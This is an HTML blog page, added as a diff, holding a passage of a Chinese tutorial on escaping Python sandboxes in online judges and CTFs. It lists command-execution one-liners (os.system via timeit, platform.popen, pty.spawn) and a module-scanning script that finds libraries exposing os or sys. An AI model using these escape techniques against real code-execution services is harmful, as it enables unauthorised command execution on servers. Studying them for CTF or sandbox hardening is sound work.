@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>python沙箱逃逸总结 - 追风少年的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="python沙箱逃逸总结" />
+<meta property="og:description" content="python沙箱逃逸总结 让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。
+前言 Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。
+顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。
+接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 os 为例。
+执行系统命令 基础知识 先啰嗦一些基础知识
+在 Python 中执行系统命令的方式有：
+oscommands：仅限2.xsubprocesstimeit：timeit.sys、timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;, number=1)platform：platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()pty：pty.spawn(&#39;ls&#39;)、pty.osbdb：bdb.os、cgi.syscgi：cgi.os、cgi.sys… 我写了一个脚本，测试了一下所有的导入 os 或者 sys 的库：
+#-*- coding:utf8 -*- # By s1ng # in 2022-04-14 02:05:12 # ------------------------------------ # this, antigravity 库删掉 all_modules_2 = [ &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;Canvas&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;Dialog&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;FileDialog&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;lsb_release&#39;, &#39;sre_parse&#39;, &#39;ScrolledText&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;SimpleDialog&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;Tix&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;Tkdnd&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;Tkinter&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;_LWPCookieJar&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;_MozillaCookieJar&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;talloc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;tkColorChooser&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;tkCommonDialog&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;tkFileDialog&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;tkFont&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;tkMessageBox&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;tkSimpleDialog&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;ttk&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;turtle&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39; ] all_modules_3 = [ &#39;AptUrl&#39;, &#39;hmac&#39;, &#39;requests_unixsocket&#39;, &#39;CommandNotFound&#39;, &#39;apport&#39;, &#39;hpmudext&#39;, &#39;resource&#39;, &#39;Crypto&#39;, &#39;apport_python_hook&#39;, &#39;html&#39;, &#39;rlcompleter&#39;, &#39;DistUpgrade&#39;, &#39;apt&#39;, &#39;http&#39;, &#39;runpy&#39;, &#39;HweSupportStatus&#39;, &#39;apt_inst&#39;, &#39;httplib2&#39;, &#39;scanext&#39;, &#39;LanguageSelector&#39;, &#39;apt_pkg&#39;, &#39;idna&#39;, &#39;sched&#39;, &#39;NvidiaDetector&#39;, &#39;aptdaemon&#39;, &#39;imaplib&#39;, &#39;secrets&#39;, &#39;PIL&#39;, &#39;aptsources&#39;, &#39;imghdr&#39;, &#39;secretstorage&#39;, &#39;Quirks&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;select&#39;, &#39;UbuntuDrivers&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;selectors&#39;, &#39;UbuntuSystemService&#39;, &#39;asn1crypto&#39;, &#39;inspect&#39;, &#39;shelve&#39;, &#39;UpdateManager&#39;, &#39;ast&#39;, &#39;io&#39;, &#39;shlex&#39;, &#39;__future__&#39;, &#39;asynchat&#39;, &#39;ipaddress&#39;, &#39;shutil&#39;, &#39;_ast&#39;, &#39;asyncio&#39;, &#39;itertools&#39;, &#39;signal&#39;, &#39;_asyncio&#39;, &#39;asyncore&#39;, &#39;janitor&#39;, &#39;simplejson&#39;, &#39;_bisect&#39;, &#39;atexit&#39;, &#39;json&#39;, &#39;site&#39;, &#39;_blake2&#39;, &#39;audioop&#39;, &#39;keyring&#39;, &#39;sitecustomize&#39;, &#39;_bootlocale&#39;, &#39;base64&#39;, &#39;keyword&#39;, &#39;six&#39;, &#39;_bz2&#39;, &#39;bdb&#39;, &#39;language_support_pkgs&#39;, &#39;smtpd&#39;, &#39;_cffi_backend&#39;, &#39;binascii&#39;, &#39;launchpadlib&#39;, &#39;smtplib&#39;, &#39;_codecs&#39;, &#39;binhex&#39;, &#39;linecache&#39;, &#39;sndhdr&#39;, &#39;_codecs_cn&#39;, &#39;bisect&#39;, &#39;locale&#39;, &#39;socket&#39;, &#39;_codecs_hk&#39;, &#39;brlapi&#39;, &#39;logging&#39;, &#39;socketserver&#39;, &#39;_codecs_iso2022&#39;, &#39;builtins&#39;, &#39;louis&#39;, &#39;softwareproperties&#39;, &#39;_codecs_jp&#39;, &#39;bz2&#39;, &#39;lsb_release&#39;, &#39;speechd&#39;, &#39;_codecs_kr&#39;, &#39;cProfile&#39;, &#39;lzma&#39;, &#39;speechd_config&#39;, &#39;_codecs_tw&#39;, &#39;cairo&#39;, &#39;macaroonbakery&#39;, &#39;spwd&#39;, &#39;_collections&#39;, &#39;calendar&#39;, &#39;macpath&#39;, &#39;sqlite3&#39;, &#39;_collections_abc&#39;, &#39;certifi&#39;, &#39;macurl2path&#39;, &#39;sre_compile&#39;, &#39;_compat_pickle&#39;, &#39;cgi&#39;, &#39;mailbox&#39;, &#39;sre_constants&#39;, &#39;_compression&#39;, &#39;cgitb&#39;, &#39;mailcap&#39;, &#39;sre_parse&#39;, &#39;_crypt&#39;, &#39;chardet&#39;, &#39;mako&#39;, &#39;ssl&#39;, &#39;_csv&#39;, &#39;chunk&#39;, &#39;markupsafe&#39;, &#39;stat&#39;, &#39;_ctypes&#39;, &#39;cmath&#39;, &#39;marshal&#39;, &#39;statistics&#39;, &#39;_ctypes_test&#39;, &#39;cmd&#39;, &#39;math&#39;, &#39;string&#39;, &#39;_curses&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;stringprep&#39;, &#39;_curses_panel&#39;, &#39;codecs&#39;, &#39;mmap&#39;, &#39;struct&#39;, &#39;_datetime&#39;, &#39;codeop&#39;, &#39;modual_test&#39;, &#39;subprocess&#39;, &#39;_dbm&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sunau&#39;, &#39;_dbus_bindings&#39;, &#39;colorsys&#39;, &#39;multiprocessing&#39;, &#39;symbol&#39;, &#39;_dbus_glib_bindings&#39;, &#39;compileall&#39;, &#39;nacl&#39;, &#39;symtable&#39;, &#39;_decimal&#39;, &#39;concurrent&#39;, &#39;netrc&#39;, &#39;sys&#39;, &#39;_dummy_thread&#39;, &#39;configparser&#39;, &#39;nis&#39;, &#39;sysconfig&#39;, &#39;_elementtree&#39;, &#39;contextlib&#39;, &#39;nntplib&#39;, &#39;syslog&#39;, &#39;_functools&#39;, &#39;copy&#39;, &#39;ntpath&#39;, &#39;systemd&#39;, &#39;_gdbm&#39;, &#39;copyreg&#39;, &#39;nturl2path&#39;, &#39;tabnanny&#39;, &#39;_hashlib&#39;, &#39;crypt&#39;, &#39;numbers&#39;, &#39;tarfile&#39;, &#39;_heapq&#39;, &#39;cryptography&#39;, &#39;oauth&#39;, &#39;telnetlib&#39;, &#39;_imp&#39;, &#39;csv&#39;, &#39;olefile&#39;, &#39;tempfile&#39;, &#39;_io&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;termios&#39;, &#39;_json&#39;, &#39;cups&#39;, &#39;operator&#39;, &#39;test&#39;, &#39;_locale&#39;, &#39;cupsext&#39;, &#39;optparse&#39;, &#39;textwrap&#39;, &#39;_lsprof&#39;, &#39;cupshelpers&#39;, &#39;orca&#39;, &#39;_lzma&#39;, &#39;curses&#39;, &#39;os&#39;, &#39;threading&#39;, &#39;_markupbase&#39;, &#39;datetime&#39;, &#39;ossaudiodev&#39;, &#39;time&#39;, &#39;_md5&#39;, &#39;dbm&#39;, &#39;parser&#39;, &#39;timeit&#39;, &#39;_multibytecodec&#39;, &#39;dbus&#39;, &#39;pathlib&#39;, &#39;token&#39;, &#39;_multiprocessing&#39;, &#39;deb822&#39;, &#39;pcardext&#39;, &#39;tokenize&#39;, &#39;_opcode&#39;, &#39;debconf&#39;, &#39;pdb&#39;, &#39;trace&#39;, &#39;_operator&#39;, &#39;debian&#39;, &#39;pexpect&#39;, &#39;traceback&#39;, &#39;_osx_support&#39;, &#39;debian_bundle&#39;, &#39;pickle&#39;, &#39;tracemalloc&#39;, &#39;_pickle&#39;, &#39;decimal&#39;, &#39;pickletools&#39;, &#39;tty&#39;, &#39;_posixsubprocess&#39;, &#39;defer&#39;, &#39;pipes&#39;, &#39;turtle&#39;, &#39;_pydecimal&#39;, &#39;difflib&#39;, &#39;pkg_resources&#39;, &#39;types&#39;, &#39;_pyio&#39;, &#39;dis&#39;, &#39;pkgutil&#39;, &#39;typing&#39;, &#39;_random&#39;, &#39;distro_info&#39;, &#39;platform&#39;, &#39;ufw&#39;, &#39;_sha1&#39;, &#39;distro_info_test&#39;, &#39;plistlib&#39;, &#39;unicodedata&#39;, &#39;_sha256&#39;, &#39;distutils&#39;, &#39;poplib&#39;, &#39;unittest&#39;, &#39;_sha3&#39;, &#39;doctest&#39;, &#39;posix&#39;, &#39;urllib&#39;, &#39;_sha512&#39;, &#39;dummy_threading&#39;, &#39;posixpath&#39;, &#39;urllib3&#39;, &#39;_signal&#39;, &#39;email&#39;, &#39;pprint&#39;, &#39;usbcreator&#39;, &#39;_sitebuiltins&#39;, &#39;encodings&#39;, &#39;problem_report&#39;, &#39;uu&#39;, &#39;_socket&#39;, &#39;enum&#39;, &#39;profile&#39;, &#39;uuid&#39;, &#39;_sqlite3&#39;, &#39;errno&#39;, &#39;pstats&#39;, &#39;venv&#39;, &#39;_sre&#39;, &#39;faulthandler&#39;, &#39;pty&#39;, &#39;wadllib&#39;, &#39;_ssl&#39;, &#39;fcntl&#39;, &#39;ptyprocess&#39;, &#39;warnings&#39;, &#39;_stat&#39;, &#39;filecmp&#39;, &#39;pwd&#39;, &#39;wave&#39;, &#39;_string&#39;, &#39;fileinput&#39;, &#39;py_compile&#39;, &#39;weakref&#39;, &#39;_strptime&#39;, &#39;fnmatch&#39;, &#39;pyatspi&#39;, &#39;webbrowser&#39;, &#39;_struct&#39;, &#39;formatter&#39;, &#39;pyclbr&#39;, &#39;wsgiref&#39;, &#39;_symtable&#39;, &#39;fractions&#39;, &#39;pydoc&#39;, &#39;xdg&#39;, &#39;_sysconfigdata_m_linux_x86_64-linux-gnu&#39;, &#39;ftplib&#39;, &#39;pydoc_data&#39;, &#39;xdrlib&#39;, &#39;_testbuffer&#39;, &#39;functools&#39;, &#39;pyexpat&#39;, &#39;xkit&#39;, &#39;_testcapi&#39;, &#39;gc&#39;, &#39;pygtkcompat&#39;, &#39;xml&#39;, &#39;_testimportmultiple&#39;, &#39;genericpath&#39;, &#39;pymacaroons&#39;, &#39;xmlrpc&#39;, &#39;_testmultiphase&#39;, &#39;getopt&#39;, &#39;pyrfc3339&#39;, &#39;xxlimited&#39;, &#39;_thread&#39;, &#39;getpass&#39;, &#39;pytz&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;gettext&#39;, &#39;queue&#39;, &#39;yaml&#39;, &#39;_tracemalloc&#39;, &#39;gi&#39;, &#39;quopri&#39;, &#39;zipapp&#39;, &#39;_warnings&#39;, &#39;glob&#39;, &#39;random&#39;, &#39;zipfile&#39;, &#39;_weakref&#39;, &#39;grp&#39;, &#39;re&#39;, &#39;zipimport&#39;, &#39;_weakrefset&#39;, &#39;gtweak&#39;, &#39;readline&#39;, &#39;zlib&#39;, &#39;_yaml&#39;, &#39;gzip&#39;, &#39;reportlab&#39;, &#39;zope&#39;, &#39;abc&#39;, &#39;hashlib&#39;, &#39;reprlib&#39;, &#39;aifc&#39;, &#39;heapq&#39; ] methods = [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;] results = {} for module in all_modules_3: results[module] = { &#39;flag&#39;: 0, &#39;result&#39;: {} } try: m = __import__(module) attrs = dir(m) for method in methods: if method in attrs: result = &#39;yes&#39; results[module][&#39;flag&#39;] = 1 else: result = &#39;no&#39; results[module][&#39;result&#39;][method] = result except Exception as e: print(e) for result in results: if results[result][&#39;flag&#39;]: print(&#39;[&#43;]&#39; &#43; result) for r in results[result][&#39;result&#39;]: print(&#39; [-]&#39; &#43; r &#43; &#39;: &#39; &#43; results[result][&#39;result&#39;][r]) all_modules_2就是 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zhuifengsn.github.io/posts/eb8e9ee6155c31f5a986fd0aa7ddf349/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-14T17:12:49+08:00" />
+<meta property="article:modified_time" content="2022-04-14T17:12:49+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="追风少年的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">追风少年的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">python沙箱逃逸总结</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h2><a id="python_0"></a>python沙箱逃逸总结</h2> 
+<p>让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。</p> 
+<h3><a id="_4"></a>前言</h3> 
+<p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。</p> 
+<p>顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。</p> 
+<p>接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 <code>os</code> 为例。</p> 
+<h3><a id="_12"></a>执行系统命令</h3> 
+<h4><a id="_14"></a>基础知识</h4> 
+<p>先啰嗦一些基础知识</p> 
+<p>在 Python 中执行系统命令的方式有：</p> 
+<ul><li>os</li><li>commands：仅限<code>2.x</code></li><li>subprocess</li><li>timeit：<code>timeit.sys</code>、<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li><li>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li><li>pty：<code>pty.spawn('ls')</code>、<code>pty.os</code></li><li>bdb：<code>bdb.os</code>、<code>cgi.sys</code></li><li>cgi：<code>cgi.os</code>、<code>cgi.sys</code></li><li>…</li></ul> 
+<p>我写了一个脚本，测试了一下所有的导入 <code>os</code> 或者 <code>sys</code> 的库：</p> 
+<pre><code class="prism language-python"><span class="token comment">#-*- coding:utf8 -*-</span>
+<span class="token comment"># By s1ng</span>
+<span class="token comment"># in 2022-04-14 02:05:12</span>
+<span class="token comment"># ------------------------------------</span>
+
+<span class="token comment"># this, antigravity 库删掉</span>
+all_modules_2 <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'BaseHTTPServer'</span><span class="token punctuation">,</span> <span class="token string">'imaplib'</span><span class="token punctuation">,</span> <span class="token string">'shelve'</span><span class="token punctuation">,</span> <span class="token string">'Bastion'</span><span class="token punctuation">,</span> <span class="token string">'anydbm'</span><span class="token punctuation">,</span> <span class="token string">'imghdr'</span><span class="token punctuation">,</span> <span class="token string">'shlex'</span><span class="token punctuation">,</span> <span class="token string">'CDROM'</span><span class="token punctuation">,</span> <span class="token string">'argparse'</span><span class="token punctuation">,</span> <span class="token string">'imp'</span><span class="token punctuation">,</span> <span class="token string">'shutil'</span><span class="token punctuation">,</span> <span class="token string">'CGIHTTPServer'</span><span class="token punctuation">,</span> <span class="token string">'array'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'signal'</span><span class="token punctuation">,</span> <span class="token string">'Canvas'</span><span class="token punctuation">,</span> <span class="token string">'ast'</span><span class="token punctuation">,</span> <span class="token string">'imputil'</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">,</span> <span class="token string">'ConfigParser'</span><span class="token punctuation">,</span> <span class="token string">'asynchat'</span><span class="token punctuation">,</span> <span class="token string">'inspect'</span><span class="token punctuation">,</span> <span class="token string">'sitecustomize'</span><span class="token punctuation">,</span> <span class="token string">'Cookie'</span><span class="token punctuation">,</span> <span class="token string">'asyncore'</span><span class="token punctuation">,</span> <span class="token string">'io'</span><span class="token punctuation">,</span> <span class="token string">'smtpd'</span><span class="token punctuation">,</span> <span class="token string">'DLFCN'</span><span class="token punctuation">,</span> <span class="token string">'atexit'</span><span class="token punctuation">,</span> <span class="token string">'itertools'</span><span class="token punctuation">,</span> <span class="token string">'smtplib'</span><span class="token punctuation">,</span> <span class="token string">'Dialog'</span><span class="token punctuation">,</span> <span class="token string">'audiodev'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'sndhdr'</span><span class="token punctuation">,</span> <span class="token string">'DocXMLRPCServer'</span><span class="token punctuation">,</span> <span class="token string">'audioop'</span><span class="token punctuation">,</span> <span class="token string">'keyword'</span><span class="token punctuation">,</span> <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'FileDialog'</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">,</span> <span class="token string">'lib2to3'</span><span class="token punctuation">,</span> <span class="token string">'spwd'</span><span class="token punctuation">,</span> <span class="token string">'FixTk'</span><span class="token punctuation">,</span> <span class="token string">'bdb'</span><span class="token punctuation">,</span> <span class="token string">'linecache'</span><span class="token punctuation">,</span> <span class="token string">'sqlite3'</span><span class="token punctuation">,</span> <span class="token string">'HTMLParser'</span><span class="token punctuation">,</span> <span class="token string">'binascii'</span><span class="token punctuation">,</span> <span class="token string">'linuxaudiodev'</span><span class="token punctuation">,</span> <span class="token string">'sre'</span><span class="token punctuation">,</span> <span class="token string">'IN'</span><span class="token punctuation">,</span> <span class="token string">'binhex'</span><span class="token punctuation">,</span> <span class="token string">'locale'</span><span class="token punctuation">,</span> <span class="token string">'sre_compile'</span><span class="token punctuation">,</span> <span class="token string">'MimeWriter'</span><span class="token punctuation">,</span> <span class="token string">'bisect'</span><span class="token punctuation">,</span> <span class="token string">'logging'</span><span class="token punctuation">,</span> <span class="token string">'sre_constants'</span><span class="token punctuation">,</span> <span class="token string">'Queue'</span><span class="token punctuation">,</span> <span class="token string">'bsddb'</span><span class="token punctuation">,</span> <span class="token string">'lsb_release'</span><span class="token punctuation">,</span> <span class="token string">'sre_parse'</span><span class="token punctuation">,</span> <span class="token string">'ScrolledText'</span><span class="token punctuation">,</span> <span class="token string">'bz2'</span><span class="token punctuation">,</span> <span class="token string">'macpath'</span><span class="token punctuation">,</span> <span class="token string">'ssl'</span><span class="token punctuation">,</span> <span class="token string">'SimpleDialog'</span><span class="token punctuation">,</span> <span class="token string">'cPickle'</span><span class="token punctuation">,</span> <span class="token string">'macurl2path'</span><span class="token punctuation">,</span> <span class="token string">'stat'</span><span class="token punctuation">,</span> <span class="token string">'SimpleHTTPServer'</span><span class="token punctuation">,</span> <span class="token string">'cProfile'</span><span class="token punctuation">,</span> <span class="token string">'mailbox'</span><span class="token punctuation">,</span> <span class="token string">'statvfs'</span><span class="token punctuation">,</span> <span class="token string">'SimpleXMLRPCServer'</span><span class="token punctuation">,</span> <span class="token string">'cStringIO'</span><span class="token punctuation">,</span> <span class="token string">'mailcap'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">'SocketServer'</span><span class="token punctuation">,</span> <span class="token string">'calendar'</span><span class="token punctuation">,</span> <span class="token string">'markupbase'</span><span class="token punctuation">,</span> <span class="token string">'stringold'</span><span class="token punctuation">,</span> <span class="token string">'StringIO'</span><span class="token punctuation">,</span> <span class="token string">'cgi'</span><span class="token punctuation">,</span> <span class="token string">'marshal'</span><span class="token punctuation">,</span> <span class="token string">'stringprep'</span><span class="token punctuation">,</span> <span class="token string">'TYPES'</span><span class="token punctuation">,</span> <span class="token string">'cgitb'</span><span class="token punctuation">,</span> <span class="token string">'math'</span><span class="token punctuation">,</span> <span class="token string">'strop'</span><span class="token punctuation">,</span> <span class="token string">'Tix'</span><span class="token punctuation">,</span> <span class="token string">'chunk'</span><span class="token punctuation">,</span> <span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token string">'struct'</span><span class="token punctuation">,</span> <span class="token string">'Tkconstants'</span><span class="token punctuation">,</span> <span class="token string">'cmath'</span><span class="token punctuation">,</span> <span class="token string">'mhlib'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> 